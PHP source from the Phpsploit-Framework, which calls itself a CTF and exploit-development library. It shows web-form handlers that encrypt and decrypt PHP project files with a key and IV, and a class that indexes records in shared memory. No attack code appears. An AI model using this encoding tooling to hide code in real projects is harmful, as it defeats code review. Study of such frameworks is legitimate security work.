                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Create Encode Of File )" ,
                    "name"  => "submit_form" ,
                    "value" => "create encode file" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset Encode File Configuration Information )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset configuration" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Encode File Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => true ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_top                 = Class_View_Top::top ();
            $_body                = array (
                "menu"    => Class_View_Build_Menu::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View::form_body ( $_form ) ) ,
            );
            $_bottom_menu         = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content             = '<div></div>';
            $_javascript          = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;} function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom              = Class_View_Bottom::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response::output ( Class_View::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Auth::check_permission ();
        }
        $_is_build = Class_Base_Request::form ( "is_build" , Class_Base_Request::TYPE_INTEGER , 0 );
        if ( ( ! empty( $_start ) ) && ( ! empty( $_is_build ) ) ) {
            $_create_new_file = Class_Operate_Build::create_new_encode_file ( $_input_file_path , $_save_directory_path , $_output_file_path , $_encode_key , $_encode_iv );
            if ( $_create_new_file !== false ) {
                if ( ! is_cli () ) {
                    Class_Base_Response::output_textarea_inner_html ( $_show_result_id , ( "\n" . 'new file : ' . $_output_file_path . ' , encode key : ' . $_encode_key . ' , encode base64 iv : ' . $_encode_iv . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                } else {
                    Class_Base_Response::outputln ( ( "\n" . 'new file : ' . $_output_file_path . ' , encode key : ' . $_encode_key . ' , encode base64 iv : ' . $_encode_iv . "\n" ) );
                }
            }
        }
        return null;
    }

    public static function decode_build ( $params = array () )
    {
        if ( ! is_cli () ) {
            if ( ( ! is_cli () ) && ( ! Class_Base_Auth::is_login () ) ) {
                Class_Base_Response::redirect ( "/login" );
                return null;
            }
            Class_Base_Auth::check_permission ();
            $_start               = Class_Base_Request::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
            $_input_file_path     = Class_Base_Request::form ( "input_file_path" , Class_Base_Request::TYPE_STRING , "" );
            $_save_directory_path = Class_Base_Request::form ( "save_directory_path" , Class_Base_Request::TYPE_STRING , "" );
            $_encode_key          = Class_Base_Request::form ( "encode_key" , Class_Base_Request::TYPE_STRING , "" );
            $_encode_iv_base64    = Class_Base_Request::form ( "encode_iv_base64" , Class_Base_Request::TYPE_STRING , "" );
            $_output_file_path    = null;
            $_show_result_id      = "show_result_id";
            $_show_error_id       = "show_error_id";
            $_cli_url             = Class_Base_Response::get_cli_url ( "/decode_build" , array ( "start" => 1 , "is_build" => 1 , "input_file_path" => $_input_file_path , "save_directory_path" => $_save_directory_path , "encode_key" => $_encode_key , "encode_iv_base64" => $_encode_iv_base64 ) );
            $_cli_encode_url      = Class_Base_Response::get_urlencode ( $_cli_url );
            $_form_top            = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Build Decode Php Project File</div>';
            $_form_top            .= '<div style="width:100%;word-break:break-all;margin-top:16px;padding-left:0;padding-right:0;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This function module is used to read the content of a specified file (with a file name suffix of .phpsploit.encode ) and decrypt it, while writing the decryption results to a newly created plaintext file (with a file name suffix of .phpsploit.php ). Note: The current version only supports decryption of encrypted PHP type files! In future versions, support for other types of files will gradually be added!</div>';
            $_form_name           = "form_0";
            $_form                = array (
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "action"    => "/decode_build" ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "selects"   => array (
                    array (
                        "id"      => "is_build" ,
                        "title"   => "Build Project : " ,
                        "name"    => "is_build" ,
                        "options" => array (
                            array ( "describe" => "Start Build" , "title" => "Decode Build" , "value" => 1 , "selected" => ( "selected" ) ) ,
                            array ( "describe" => "No Start Build" , "title" => "No Build" , "value" => 0 , ) ,
                        ) ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"    => "input_file_path" ,
                        "title" => "Input File Path : " ,
                        "name"  => "input_file_path" ,
                        "value" => $_input_file_path ,
                    ) ,
                    array (
                        "id"    => "save_directory_path" ,
                        "title" => "Save Directory Path : " ,
                        "name"  => "save_directory_path" ,
                        "value" => $_save_directory_path ,
                    ) ,
                    array (
                        "id"    => "encode_key" ,
                        "title" => "Encode Key : " ,
                        "name"  => "encode_key" ,
                        "value" => $_encode_key ,
                    ) ,
                    array (
                        "id"    => "encode_iv_base64" ,
                        "title" => "Encode Iv Base64 : " ,
                        "name"  => "encode_iv_base64" ,
                        "value" => $_encode_iv_base64 ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"    => $_show_result_id ,
                        "title" => "( Build Result )   : " ,
                        "name"  => $_show_result_id ,
                        "value" => "" ,
                        "style" => 'height:800px;' ,
                    ) ,
                    array (
                        "id"       => $_show_error_id ,
                        "title"    => "( Error Message )   : " ,
                        "name"     => $_show_error_id ,
                        "value"    => "" ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Create Decode Of File )" ,
                    "name"  => "submit_form" ,
                    "value" => "create decode file" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset Decode File Configuration Information )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset configuration" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Decode File Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => true ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_top                 = Class_View_Top::top ();
            $_body                = array (
                "menu"    => Class_View_Build_Menu::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View::form_body ( $_form ) ) ,
            );
            $_bottom_menu         = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content             = '<div></div>';
            $_javascript          = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;} function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom              = Class_View_Bottom::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response::output ( Class_View::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Auth::check_permission ();
        }
        $_is_build = Class_Base_Request::form ( "is_build" , Class_Base_Request::TYPE_INTEGER , 0 );
        if ( ( ! empty( $_start ) ) && ( ! empty( $_is_build ) ) ) {
            $_create_new_file = Class_Operate_Build::create_new_decode_php_file ( $_input_file_path , $_save_directory_path , $_output_file_path , $_encode_key , $_encode_iv_base64 );
            if ( $_create_new_file !== false ) {
                if ( ! is_cli () ) {
                    Class_Base_Response::output_textarea_inner_html ( $_show_result_id , ( "\n" . 'new file : ' . $_output_file_path . ' , encode key : ' . $_encode_key . ' , encode base64 iv : ' . $_encode_iv_base64 . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                } else {
                    Class_Base_Response::outputln ( ( "\n" . 'new file : ' . $_output_file_path . ' , encode key : ' . $_encode_key . ' , encode base64 iv : ' . $_encode_iv_base64 . "\n" ) );
                }
            }
        }
        return null;
    }

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午4:59
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Block_Indexes extends Class_Base_Block implements Interface_Base_Block_Indexes
{
    private static $_indexes_keys = array ();
    private        $_head         = null;
    private        $_content      = null;
    private        $_end_flag     = null;

    public static function get_key ()
    {
        return Interface_Base_BlockKey::INDEXES;
    }

    public static function exist_indexes_key ( $key )
    {
        if ( ( in_array ( $key , self::$_indexes_keys ) ) ) {
            return true;
        }
        return false;
    }

    public static function add_indexes_key ( $key )
    {
        if ( ! self::exist_indexes_key ( $key ) ) {
            self::$_indexes_keys[] = $key;
        }
    }

    public static function clear_indexes_key ( $key )
    {
        if ( self::exist_indexes_key ( $key ) ) {
            foreach ( self::$_indexes_keys as $index => $indexes_key ) {
                if ( $indexes_key == $key ) {
                    self::$_indexes_keys[ $index ] = null;
                    unset( self::$_indexes_keys[ $index ] );
                }
            }
        }
    }

    public static function get_indexes_keys ()
    {
        return self::$_indexes_keys;
    }

    public static function get_block_size ()
    {
        return self::SIZE_BLOCK;
    }

    public static function get_head_size ()
    {
        return Class_Base_BlockHead::get_head_size ();
    }

    public static function get_content_size ()
    {
        return self::SIZE_MAP;
    }

    public static function exist_indexes_item_block_key ( $key , $indexes_item_block_key )
    {
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item_block_key = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY , self::TYPE_CONTENT_STRING );
                if ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) {
                    $_indexes_item_block_key = Class_Base_Format::format_key_read ( $_indexes_item_block_key );
                    if ( $_indexes_item_block_key == $indexes_item_block_key ) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    public static function exist_indexes_item_block_name ( $key , $indexes_item_block_name )
    {
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item_block_name = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME , self::TYPE_CONTENT_STRING );
                if ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) {
                    $_indexes_item_block_name = Class_Base_Format::format_name_read ( $_indexes_item_block_name );
                    if ( $_indexes_item_block_name == $indexes_item_block_name ) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    public static function exist_indexes_item_by_block_key_and_block_name ( $key , $block_key , $block_name )
    {
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item            = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                $_indexes_item_block_name = Class_Base_Format::format_name_read ( substr ( $_indexes_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) );
                $_indexes_item_block_key  = Class_Base_Format::format_key_read ( substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) );
                if ( ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) && ( $_indexes_item_block_key == $block_key ) ) {
                    return true;
                }
                if ( ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) && ( $_indexes_item_block_name == $block_name ) ) {
                    return true;
                }
            }
        }
        return false;
    }

    public static function exist_indexes_item ( $key , $indexes_item )
    {
        if ( ( empty( $indexes_item ) ) || ( ! is_object ( $indexes_item ) ) || ( ! ( $indexes_item instanceof Class_Base_Block_IndexesItem ) ) ) {
            throw new \Exception( "indexes_item is not a IndexesItem object , indexes_item ( " . $indexes_item . " ) " , 0 );
        }
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item            = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                $_indexes_item_block_name = Class_Base_Format::format_name_read ( substr ( $_indexes_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) );
                $_indexes_item_block_key  = Class_Base_Format::format_key_read ( substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) );
                if ( ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) && ( $_indexes_item_block_key == $indexes_item->get_block_key () ) ) {
                    return true;
                }
                if ( ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) && ( $_indexes_item_block_name == $indexes_item->get_block_name () ) ) {
                    return true;
                }
            }
        }
        return false;
    }

    public static function write_indexes_item ( $key , $indexes_item )
    {
        if ( ( empty( $indexes_item ) ) || ( ! is_object ( $indexes_item ) ) || ( ! ( $indexes_item instanceof Class_Base_Block_IndexesItem ) ) ) {
            throw new \Exception( "indexes_item is not a IndexesItem object , indexes_item ( " . $indexes_item . " ) " , 0 );
        }
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            $_exist = self::exist_indexes_item ( $key , $indexes_item );
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                if ( empty( $_exist ) ) {
                    if ( Class_Base_Format::is_empty ( $_indexes_item ) ) {
                        $_indexes_item = $indexes_item->get_block_string ();
                        $_write_length = Class_Base_Memory::write_share_memory ( $_block_id , $_indexes_item , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::TYPE_CONTENT_STRING );
                        return $_write_length;
                    }
                } else {
                    if ( ! Class_Base_Format::is_empty ( $_indexes_item ) ) {
                        $_indexes_item_block_name = Class_Base_Format::format_name_read ( substr ( $_indexes_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_HEAD_BLOCK_NAME ) );
                        $_indexes_item_block_key  = Class_Base_Format::format_key_read ( substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_HEAD_BLOCK_KEY ) );
                        if ( ( ( $indexes_item->get_block_key () == $_indexes_item_block_key ) && ( $indexes_item->get_block_name () != $_indexes_item_block_name ) ) || ( ( $indexes_item->get_block_key () != $_indexes_item_block_key ) && ( $indexes_item->get_block_name () == $_indexes_item_block_name ) ) ) {
                            throw new \Exception( "indexes item block_key or block_name is error , memory block_key ( " . $_indexes_item_block_key . " ) , memory block_name ( " . $_indexes_item_block_name . " ) , object block_key ( " . $indexes_item->get_block_key () . " ) , object block_name ( " . $indexes_item->get_block_name () . " ) " , 0 );
                        }
                        if ( ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) && ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) && ( ! Class_Base_Format::is_empty ( $indexes_item->get_block_key () ) ) && ( ! Class_Base_Format::is_empty ( $indexes_item->get_block_name () ) ) && ( $indexes_item->get_block_key () == $_indexes_item_block_key ) && ( $indexes_item->get_block_name () == $_indexes_item_block_name ) ) {
                            $_indexes_item = $indexes_item->get_block_string ();
                            $_write_length = Class_Base_Memory::write_share_memory ( $_block_id , $_indexes_item , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::TYPE_CONTENT_STRING );
                            return $_write_length;
                        }
                    }
                }
            }
        }
        return false;
    }

    public static function read_indexes_item ( $key , $indexes_item_block_key , $indexes_item_block_name )
    {
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            $_exist = self::exist_indexes_item_by_block_key_and_block_name ( $key , $indexes_item_block_key , $indexes_item_block_name );
            if ( ! $_exist ) {
                return null;
            }
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                if ( ! Class_Base_Format::is_empty ( $_indexes_item ) ) {
                    $_indexes_item_block_name = Class_Base_Format::format_name_read ( substr ( $_indexes_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_HEAD_BLOCK_NAME ) );
                    $_indexes_item_block_key  = Class_Base_Format::format_key_read ( substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_HEAD_BLOCK_KEY ) );
                    if ( ( $indexes_item_block_key == $_indexes_item_block_key ) && ( $indexes_item_block_name != $_indexes_item_block_name ) || ( $indexes_item_block_key != $_indexes_item_block_key ) && ( $indexes_item_block_name == $_indexes_item_block_name ) ) {
                        throw new \Exception( "indexes item block_key or block_name is error , memory block_key ( " . $_indexes_item_block_key . " ) , memory block_name ( " . $_indexes_item_block_name . " ) , object block_key ( " . $indexes_item_block_key . " ) , object block_name ( " . $indexes_item_block_name . " ) " , 0 );
                    }
                    if ( ( ! Class_Base_Format::is_empty ( $indexes_item_block_key ) ) && ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) && ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) && ( ! Class_Base_Format::is_empty ( $indexes_item_block_name ) ) && ( $indexes_item_block_key == $_indexes_item_block_key ) && ( $indexes_item_block_name == $_indexes_item_block_name ) ) {
                        $_indexes_item    = Class_Base_Block_IndexesItem::indexes_item_string_to_indexes_item_object ( $_indexes_item );
                        $_item_block_size = ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $_indexes_item->get_content_size () + Interface_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG );
                        $_item_block_id   = Class_Base_Memory::open_share_memory ( $_indexes_item->get_block_key () , $_indexes_item->get_block_mode () , $_item_block_size );
                        $_item_block_data = Class_Base_Memory::read_share_memory ( $_item_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD ) , self::get_content_size () , self::TYPE_CONTENT_STRING );
                        if ( $_indexes_item->get_content_type () == self::TYPE_CONTENT_INTEGER ) {
                            $_item_block_data = Class_Base_Format::hex_to_dec ( $_item_block_data );
                        } else {
                            $_item_block_data = Class_Base_Format::content_to_string ( $_item_block_data );
                        }
                        return $_item_block_data;
                    }
                }

            }
        }
        return null;
    }

    public static function write_indexes_item_content ( $key , $indexes_item , $indexes_item_content )
    {
        if ( ( empty( $indexes_item ) ) || ( ! is_object ( $indexes_item ) ) || ( ! ( $indexes_item instanceof Class_Base_Block_IndexesItem ) ) ) {
            throw new \Exception( "indexes_item is not a IndexesItem object , indexes_item ( " . $indexes_item . " ) " , 0 );
        }
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            $_exist = self::exist_indexes_item ( $key , $indexes_item );
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                if ( empty( $_exist ) ) {
                    if ( Class_Base_Format::is_empty ( $_indexes_item ) ) {
                        $_indexes_item = $indexes_item->get_block_string ();
                        $_write_length = Class_Base_Memory::write_share_memory ( $_block_id , $_indexes_item , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::TYPE_CONTENT_STRING );
                        return $_write_length;
                    }
                } else {
                    if ( ! Class_Base_Format::is_empty ( $_indexes_item ) ) {
                        $_indexes_item_block_name = Class_Base_Format::format_name_read ( substr ( $_indexes_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_HEAD_BLOCK_NAME ) );
                        $_indexes_item_block_key  = Class_Base_Format::format_key_read ( substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_HEAD_BLOCK_KEY ) );
                        if ( ( ( $indexes_item->get_block_key () == $_indexes_item_block_key ) && ( $indexes_item->get_block_name () != $_indexes_item_block_name ) ) || ( ( $indexes_item->get_block_key () != $_indexes_item_block_key ) && ( $indexes_item->get_block_name () == $_indexes_item_block_name ) ) ) {
                            throw new \Exception( "indexes item block_key or block_name is error , memory block_key ( " . $_indexes_item_block_key . " ) , memory block_name ( " . $_indexes_item_block_name . " ) , object block_key ( " . $indexes_item->get_block_key () . " ) , object block_name ( " . $indexes_item->get_block_name () . " ) " , 0 );
                        }
                        if ( ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) && ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) && ( ! Class_Base_Format::is_empty ( $indexes_item->get_block_key () ) ) && ( ! Class_Base_Format::is_empty ( $indexes_item->get_block_name () ) ) && ( $indexes_item->get_block_key () == $_indexes_item_block_key ) && ( $indexes_item->get_block_name () == $_indexes_item_block_name ) ) {
                            if ( $indexes_item->get_content_type () == Interface_Base_BlockContentType::TYPE_CONTENT_INTEGER ) {
                                $indexes_item_content = Class_Base_Format::dec_to_hex ( $indexes_item_content );
                            } else {
                                $indexes_item_content = Class_Base_Format::string_to_content ( $indexes_item_content , $indexes_item->get_content_size () );
                            }
                            $_item_block_size = ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $indexes_item->get_content_size () + Interface_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG );
                            $_item_block_id   = Class_Base_Memory::open_share_memory ( $indexes_item->get_block_key () , $indexes_item->get_block_mode () , $_item_block_size );
                            if ( ! empty( $_item_block_id ) ) {
                                $_write_length = Class_Base_Memory::write_share_memory ( $_item_block_id , $indexes_item_content , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD ) , self::TYPE_CONTENT_STRING );
                                return $_write_length;
                            }
                        }
                    }
                }
            }
        }
        return false;
    }

    public static function read_indexes_item_content ( $key , $indexes_item_block_key , $indexes_item_block_name , $indexes_item_content )
    {
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            $_exist = self::exist_indexes_item_by_block_key_and_block_name ( $key , $indexes_item_block_key , $indexes_item_block_name );
            if ( ! $_exist ) {
                return null;
            }
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                if ( ! Class_Base_Format::is_empty ( $_indexes_item ) ) {
                    $_indexes_item_block_name = Class_Base_Format::format_name_read ( substr ( $_indexes_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_HEAD_BLOCK_NAME ) );
                    $_indexes_item_block_key  = Class_Base_Format::format_key_read ( substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_HEAD_BLOCK_KEY ) );
                    if ( ( $indexes_item_block_key == $_indexes_item_block_key ) && ( $indexes_item_block_name != $_indexes_item_block_name ) || ( $indexes_item_block_key != $_indexes_item_block_key ) && ( $indexes_item_block_name == $_indexes_item_block_name ) ) {
                        throw new \Exception( "indexes item block_key or block_name is error , memory block_key ( " . $_indexes_item_block_key . " ) , memory block_name ( " . $_indexes_item_block_name . " ) , object block_key ( " . $indexes_item_block_key . " ) , object block_name ( " . $indexes_item_block_name . " ) " , 0 );
                    }
                    if ( ( ! Class_Base_Format::is_empty ( $indexes_item_block_key ) ) && ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) && ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) && ( ! Class_Base_Format::is_empty ( $indexes_item_block_name ) ) && ( $indexes_item_block_key == $_indexes_item_block_key ) && ( $indexes_item_block_name == $_indexes_item_block_name ) ) {
                        $_indexes_item = Class_Base_Block_IndexesItem::indexes_item_string_to_indexes_item_object ( $_indexes_item );
                        return $_indexes_item;
                    }
                }

            }
        }
        return null;
    }

    public static function clear_indexes_item ( $key , $indexes_item_block_key , $indexes_item_block_name , $exit = 0 )
    {
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item              = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                $_indexes_item_block_name   = substr ( $_indexes_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME );
                $_indexes_item_block_key    = substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY );
                $_indexes_item_content_size = substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) , self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE );
                $_indexes_item_block_type   = substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE );
                if ( ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) && ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) ) {
                    $_indexes_item_block_key  = Class_Base_Format::format_key_read ( $_indexes_item_block_key );
                    $_indexes_item_block_name = Class_Base_Format::format_name_read ( $_indexes_item_block_name );
                    if ( ( $_indexes_item_block_key == $indexes_item_block_key ) && ( $_indexes_item_block_name == $indexes_item_block_name ) ) {
                        $_indexes_item_block_type = Class_Base_Format::format_type_read ( $_indexes_item_block_type );
                        if ( $_indexes_item_block_type != self::TYPE_BLOCK_DATA ) {
                            throw new \Exception( "Cannot delete indexes_item , block_type is not equal to block_data , block_key ( " . $_indexes_item_block_key . " ) , block_name ( " . $_indexes_item_block_name . " ) , content_size ( " . $_indexes_item_content_size . " ) , block_type ( " . $_indexes_item_block_type . " ) " , 0 );
                        }
                        $_indexes_item_content_size = Class_Base_Format::format_size_read ( $_indexes_item_content_size );
                        $_bool                      = Class_Base_Memory::clear_share_memory_by_key ( $_indexes_item_block_key , $_indexes_item_content_size );
                        if ( empty( $_bool ) ) {
                            throw new \Exception( "delete indexes_item is error , block_key ( " . $_indexes_item_block_key . " ) , block_name ( " . $_indexes_item_block_name . " ) , content_size ( " . $_indexes_item_content_size . " ) , block_type ( " . $_indexes_item_block_type . " ) " , 0 );
                        }
                        $_indexes_item = Class_Base_Format::string_to_data ( null , self::SIZE_MAP_ITEM );
